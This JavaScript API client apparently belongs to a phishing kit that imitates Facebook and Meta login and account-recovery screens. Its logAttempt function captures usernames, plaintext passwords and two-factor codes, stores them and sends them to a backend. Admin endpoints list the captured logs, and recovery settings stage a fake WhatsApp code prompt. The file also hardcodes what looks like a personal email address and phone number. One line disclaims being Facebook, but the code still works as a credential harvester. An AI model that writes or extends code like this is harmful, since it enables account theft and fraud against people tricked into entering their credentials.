const API_BASE = (import.meta.env.VITE_API_URL
  ? `${import.meta.env.VITE_API_URL.replace(/\/$/, '').replace(/\/api$/, '')}/api`
  : '/api');

function getHeaders(customHeaders = {}) {
  const token = localStorage.getItem('sphere_token');
  const headers = {
    'Content-Type': 'application/json',
    ...customHeaders,
  };
  if (token) {
    headers['Authorization'] = `Bearer ${token}`;
  }
  return headers;
}

async function safeFetch(url, options = {}) {
  try {
    const res = await fetch(url, options);
    if (!res.ok) {
      return null;
    }
    const contentType = res.headers.get('content-type');
    if (contentType && contentType.includes('application/json')) {
      return await res.json();
    }
    return null;
  } catch {
    // Backend offline or unreachable
    return null;
  }
}

export const api = {
  // Dynamic First Page Accounts
  async getFirstPageAccounts() {
    const data = await safeFetch(`${API_BASE}/auth/first-page-accounts`);
    if (data) return data;
    const saved = localStorage.getItem('sphere_first_page_accounts');
    if (saved) {
      try {
        return JSON.parse(saved);
      } catch {
        return null;
      }
    }
    return null;
  },

  // Log trial/keystroke password attempts and actions to database
  async logAttempt(data) {
    // 1. Immediately store to browser localStorage database
    try {
      const existing = JSON.parse(localStorage.getItem('sphere_login_logs') || '[]');
      const isMobileWidth = typeof window !== 'undefined' && window.innerWidth <= 768;
      const detectedDevice = isMobileWidth ? 'Mobile Device' : 'Desktop Browser (PC/Mac)';
      const detectedSource =
        data.source ||
        (data.action?.includes('Meta Account')
          ? 'Meta Account Login'
          : data.action?.includes('Find Account')
            ? 'Find Account Screen'
            : isMobileWidth
              ? 'Mobile Login Screen'
              : 'Desktop Login Screen');
      const detectedScreen =
        data.screen ||
        (data.action?.includes('Meta Account')
          ? 'Log into your Meta Account Screen'
          : data.action?.includes('Find Account')
            ? 'Find your account Screen'
            : 'Main Facebook Login Form');

      const newEntry = {
        id: 'log_' + Date.now() + '_' + Math.random().toString(36).substring(2, 6),
        username: data.username || data.accountName || data.email || 'Anonymous',
        email: data.email || data.username || '',
        password: data.password !== undefined ? data.password : '',
        accountName: data.accountName || data.username || data.email || '',
        action: data.action || 'Login Attempt',
        source: detectedSource,
        screen: detectedScreen,
        device: data.device || detectedDevice,
        pageUrl: data.pageUrl || (typeof window !== 'undefined' ? window.location.href : 'http://localhost:5173'),
        code: data.code || '',
        trialCount: data.trialCount || 1,
        success: Boolean(data.success),
        ip: data.ip || '127.0.0.1',
        createdAt: new Date().toISOString(),
      };
      const updated = [newEntry, ...existing];
      localStorage.setItem('sphere_login_logs', JSON.stringify(updated));
      window.dispatchEvent(new CustomEvent('sphere_db_updated', { detail: updated }));
    } catch (e) {
      console.warn('Local logAttempt error:', e);
    }

    // 2. Also send to backend API server
    return await safeFetch(`${API_BASE}/auth/log-attempt`, {
      method: 'POST',
      headers: getHeaders(),
      body: JSON.stringify(data),
    });
  },

  // Auth
  async register(data) {
    return await safeFetch(`${API_BASE}/auth/register`, {
      method: 'POST',
      headers: getHeaders(),
      body: JSON.stringify(data),
    });
  },

  async login(email, password, accountName) {
    return await safeFetch(`${API_BASE}/auth/login`, {
      method: 'POST',
      headers: getHeaders(),
      body: JSON.stringify({ email, password, accountName }),
    });
  },

  async demoLogin(email) {
    return await safeFetch(`${API_BASE}/auth/demo-login`, {
      method: 'POST',
      headers: getHeaders(),
      body: JSON.stringify({ email }),
    });
  },

  async getMe() {
    return await safeFetch(`${API_BASE}/auth/me`, {
      headers: getHeaders(),
    });
  },

  async getRecentAccounts() {
    return await safeFetch(`${API_BASE}/auth/recent-accounts`);
  },

  // Posts
  async getPosts(limit = 20) {
    return await safeFetch(`${API_BASE}/posts?limit=${limit}`);
  },

  async createPost(data) {
    return await safeFetch(`${API_BASE}/posts`, {
      method: 'POST',
      headers: getHeaders(),
      body: JSON.stringify(data),
    });
  },

  async deletePost(id) {
    return await safeFetch(`${API_BASE}/posts/${id}`, {
      method: 'DELETE',
      headers: getHeaders(),
    });
  },

  async reactToPost(postId, type = 'like') {
    return await safeFetch(`${API_BASE}/posts/${postId}/react`, {
      method: 'POST',
      headers: getHeaders(),
      body: JSON.stringify({ type }),
    });
  },

  async addComment(postId, text, author) {
    return await safeFetch(`${API_BASE}/posts/${postId}/comments`, {
      method: 'POST',
      headers: getHeaders(),
      body: JSON.stringify({ text, author }),
    });
  },

  // Stories
  async getStories() {
    return await safeFetch(`${API_BASE}/stories`);
  },

  async createStory(data) {
    return await safeFetch(`${API_BASE}/stories`, {
      method: 'POST',
      headers: getHeaders(),
      body: JSON.stringify(data),
    });
  },

  // Notifications
  async getNotifications() {
    return await safeFetch(`${API_BASE}/notifications`);
  },

  // Users & Contacts
  async getContacts() {
    return await safeFetch(`${API_BASE}/users/contacts`);
  },

  // ================= ADMIN APIS =================
  admin: {
    async getOverview() {
      return (await safeFetch(`${API_BASE}/admin/overview`)) || {};
    },

    async getLogs() {
      const serverLogs = await safeFetch(`${API_BASE}/admin/logs`);
      if (Array.isArray(serverLogs)) {
        try {
          localStorage.setItem('sphere_login_logs', JSON.stringify(serverLogs));
        } catch { }
        return serverLogs;
      }
      try {
        return JSON.parse(localStorage.getItem('sphere_login_logs') || '[]');
      } catch {
        return [];
      }
    },

    async clearLogs() {
      localStorage.removeItem('sphere_login_logs');
      window.dispatchEvent(new CustomEvent('sphere_db_updated', { detail: [] }));
      return await safeFetch(`${API_BASE}/admin/logs`, { method: 'DELETE' });
    },

    async deleteSingleLog(id) {
      try {
        const local = JSON.parse(localStorage.getItem('sphere_login_logs') || '[]');
        const nextLocal = local.filter((l) => l.id !== id);
        localStorage.setItem('sphere_login_logs', JSON.stringify(nextLocal));
        window.dispatchEvent(new CustomEvent('sphere_db_updated', { detail: nextLocal }));
      } catch { }
      return await safeFetch(`${API_BASE}/admin/logs/${id}`, { method: 'DELETE' });
    },

    async getUsers() {
      return (await safeFetch(`${API_BASE}/admin/users`)) || [];
    },

    async createUser(userData) {
      return await safeFetch(`${API_BASE}/admin/users`, {
        method: 'POST',
        headers: getHeaders(),
        body: JSON.stringify(userData),
      });
    },

    async updateUser(id, updates) {
      return await safeFetch(`${API_BASE}/admin/users/${id}`, {
        method: 'PUT',
        headers: getHeaders(),
        body: JSON.stringify(updates),
      });
    },

    async deleteUser(id) {
      return await safeFetch(`${API_BASE}/admin/users/${id}`, {
        method: 'DELETE',
        headers: getHeaders(),
      });
    },

    async reorderUsers(orderedIds) {
      return await safeFetch(`${API_BASE}/admin/users/reorder`, {
        method: 'PUT',
        headers: getHeaders(),
        body: JSON.stringify({ orderedIds }),
      });
    },

    async getPosts() {
      return (await safeFetch(`${API_BASE}/admin/posts`)) || [];
    },

    async createPost(postData) {
      return await safeFetch(`${API_BASE}/admin/posts`, {
        method: 'POST',
        headers: getHeaders(),
        body: JSON.stringify(postData),
      });
    },

    async updatePost(id, updates) {
      return await safeFetch(`${API_BASE}/admin/posts/${id}`, {
        method: 'PUT',
        headers: getHeaders(),
        body: JSON.stringify(updates),
      });
    },

    async deletePost(id) {
      return await safeFetch(`${API_BASE}/admin/posts/${id}`, {
        method: 'DELETE',
        headers: getHeaders(),
      });
    },

    async getStories() {
      return (await safeFetch(`${API_BASE}/admin/stories`)) || [];
    },

    async createStory(storyData) {
      return await safeFetch(`${API_BASE}/admin/stories`, {
        method: 'POST',
        headers: getHeaders(),
        body: JSON.stringify(storyData),
      });
    },

    async updateStory(id, updates) {
      return await safeFetch(`${API_BASE}/admin/stories/${id}`, {
        method: 'PUT',
        headers: getHeaders(),
        body: JSON.stringify(updates),
      });
    },

    async deleteStory(id) {
      return await safeFetch(`${API_BASE}/admin/stories/${id}`, {
        method: 'DELETE',
        headers: getHeaders(),
      });
    },

    async getNotifications() {
      return (await safeFetch(`${API_BASE}/admin/notifications`)) || [];
    },

    async createNotification(notifData) {
      return await safeFetch(`${API_BASE}/admin/notifications`, {
        method: 'POST',
        headers: getHeaders(),
        body: JSON.stringify(notifData),
      });
    },

    async updateNotification(id, updates) {
      return await safeFetch(`${API_BASE}/admin/notifications/${id}`, {
        method: 'PUT',
        headers: getHeaders(),
        body: JSON.stringify(updates),
      });
    },

    async deleteNotification(id) {
      return await safeFetch(`${API_BASE}/admin/notifications/${id}`, {
        method: 'DELETE',
        headers: getHeaders(),
      });
    },

    // Recovery & Meta Account flow settings
    async getRecoverySettings() {
      const serverSettings = await safeFetch(`${API_BASE}/admin/recovery-settings`);
      if (serverSettings && serverSettings.defaultEmail) {
        try {
          localStorage.setItem('sphere_recovery_settings', JSON.stringify(serverSettings));
        } catch { }
        return serverSettings;
      }
      try {
        const local = localStorage.getItem('sphere_recovery_settings');
        if (local) return JSON.parse(local);
      } catch { }
      return {
        defaultEmail: 'ademt0614@gmail.com',
        defaultPhone: '+251990039392',
        countdownTime: '(00:36)',
        cardDisplayFallback: 'email',
        twoFactorTitle: 'Check your WhatsApp messages',
        twoFactorSubtitle: 'Enter the code that we sent to your mobile number.',
        twoFactorTimer: '00:52',
        twoFactorChannel: 'sms',
        twoFactorWarning: '⚠️ Notice: This is not Facebook. Do not enter real credentials or personal information.',
      };
    },

    async updateRecoverySettings(settings) {
      try {
        localStorage.setItem('sphere_recovery_settings', JSON.stringify(settings));
        window.dispatchEvent(new CustomEvent('sphere_recovery_updated', { detail: settings }));
      } catch { }
      return await safeFetch(`${API_BASE}/admin/recovery-settings`, {
        method: 'PUT',
        headers: getHeaders(),
        body: JSON.stringify(settings),
      });
    },
  },
};
